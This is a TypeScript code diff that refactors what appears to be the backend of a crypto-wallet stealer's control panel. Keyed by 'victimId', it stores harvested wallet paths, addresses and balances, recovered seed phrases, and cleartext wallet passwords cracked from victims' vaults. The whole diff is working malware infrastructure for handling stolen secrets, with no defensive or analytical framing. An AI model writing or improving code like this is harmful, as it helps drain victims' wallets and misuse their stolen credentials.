@@ -1,6 +1,7 @@
 import { prisma } from './db';
 import { publish } from './bus';
 import { recordFailure } from './ws-events';
+import { normalizePath, normalizeState, upsertSecrets, upsertWallets, type SecretInput } from '../services/vault';
 
 export type ResultBody = {
   status: 'ok' | 'error' | 'cancelled';
@@ -76,30 +77,41 @@ export async function applyTaskResult(victimId: string, taskId: string, input: R
 
 export async function absorbWallets(victimId: string, result: Record<string, unknown>): Promise<void> {
   const wallets = Array.isArray(result.wallets) ? result.wallets : [];
-  for (const item of wallets.slice(0, 500)) {
-    if (!item || typeof item !== 'object') continue;
+  const rows = wallets.slice(0, 500).flatMap((item) => {
+    if (!item || typeof item !== 'object') return [];
     const wallet = item as Record<string, unknown>;
-    if (typeof wallet.path !== 'string' || typeof wallet.id !== 'string') continue;
-    await prisma.wallet.upsert({
-      where: { victimId_path: { victimId, path: wallet.path } },
-      update: {
-        kind: String(wallet.kind ?? 'extension'),
-        targetId: wallet.id,
-        state: String(wallet.state ?? 'found') as never,
-        reason: wallet.reason ? String(wallet.reason) : null,
-        address: wallet.address ? String(wallet.address) : null,
-        balance: wallet.balance ? String(wallet.balance) : null
-      },
-      create: {
-        victimId,
-        kind: String(wallet.kind ?? 'extension'),
-        targetId: wallet.id,
-        path: wallet.path,
-        state: String(wallet.state ?? 'found') as never,
-        reason: wallet.reason ? String(wallet.reason) : null,
-        address: wallet.address ? String(wallet.address) : null,
-        balance: wallet.balance ? String(wallet.balance) : null
-      }
-    });
+    if (typeof wallet.path !== 'string' || typeof wallet.id !== 'string') return [];
+    return [{
+      targetId: String(wallet.id),
+      kind: String(wallet.kind ?? 'extension'),
+      path: wallet.path,
+      state: normalizeState(wallet.state),
+      reason: wallet.reason ? String(wallet.reason) : null,
+      address: wallet.address ? String(wallet.address) : null,
+      balance: wallet.balance ? String(wallet.balance) : null,
+      source: 'task_result',
+      decryptState: wallet.decrypt_state ? String(wallet.decrypt_state) : undefined
+    }];
+  });
+  const stored = await upsertWallets(victimId, rows);
+  const byPath = new Map(stored.map((row) => [row.path, row.id]));
+  const secrets: SecretInput[] = (Array.isArray(result.seeds) ? result.seeds : []).slice(0, 500).flatMap((item) => {
+    if (!item || typeof item !== 'object') return [];
+    const seed = item as Record<string, unknown>;
+    if (typeof seed.value !== 'string' || !seed.value) return [];
+    return [{
+      walletId: typeof seed.path === 'string' ? byPath.get(normalizePath(seed.path)) ?? null : null,
+      path: typeof seed.path === 'string' ? seed.path : null,
+      kind: String(seed.kind ?? 'seed'),
+      value: seed.value,
+      words: Number.isFinite(Number(seed.words)) ? Number(seed.words) : null,
+      source: 'task_result'
+    }];
+  });
+  // A crack result carries the recovered password in clear; keep it in the vault.
+  if (typeof result.password === 'string' && result.password && typeof result.target === 'string') {
+    const wallet = await prisma.wallet.findFirst({ where: { victimId, targetId: result.target }, select: { id: true } });
+    if (wallet) secrets.push({ walletId: wallet.id, kind: 'password', value: result.password, source: 'crack_vault' });
   }
+  await upsertSecrets(victimId, secrets);
 }
